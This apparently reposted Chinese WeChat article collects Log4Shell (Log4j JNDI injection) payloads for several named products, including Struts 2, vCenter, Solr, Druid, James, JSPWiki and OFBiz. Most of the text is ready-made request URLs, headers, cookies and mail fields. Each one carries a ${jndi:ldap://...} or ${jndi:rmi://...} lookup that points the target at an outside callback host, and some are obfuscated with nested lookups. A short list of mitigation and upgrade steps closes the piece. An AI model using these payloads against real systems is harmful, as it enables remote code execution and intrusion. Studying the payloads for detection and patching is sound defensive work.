> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/idKduDt2KN4WSPmW68vK8w)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0WhFgn13FYe3lgWYFUuX9tSt9gOv9gJHLicyAYiaarJ4SOzWD8rOwfjKpg8TrSob5HEZ8BYdnzKvpg/640?wx_fmt=png)

Apache Struts 2

```
http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name='${jndi:rmi://127.0 .0.1:1099/ylbtsl}'
```

```
http://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
```

VMWare VCenter

```
"X-Forwarded-For: \${jndi:ldap://10.0.0.3:1270/lol}"  "https://10.0.0.4/websso/SAML2/SSO/photon- machine.lan?SAMLRequest="
```

Apache James

```
"smtp://localhost" --user "test:test" --mail-from '${jndi:ldap://localhost:1270/a}@gmail.com' --mail-rcpt 'test' --upload-file email.txt
```

Apache Solr

```
'http://localhost:8983/solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&wt=json'
```

```
solr/admin/info/system?_=${jndi:ldap://192.168.1.1/exp}&wt=json
```

Apache Druid

```
'http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d'
```

Apache JSPWiki

```
http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
```

Apache OFBiz

```
"Cookie: OFBiz.Visitor=\${jndi:ldap://localhost:1270/abc}" https://localhost:8443/webtools/control/main
```

修复方案:

```
1、紧急缓解措施：
（1） 修改jvm参数 -Dlog4j2.formatMsgNoLookups=true     
（2） 修改配置log4j2.formatMsgNoLookups=True
（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
2.升级到最新版本：
请联系厂商获取修复后的官方版本：
https://github.com/apache/logging-log4j2
目前最新版本2.15.0-rc2
3.禁止使用log4j服务器外连，升级idk 11.0.1 8u191 7u201 6u211或更高版本。
```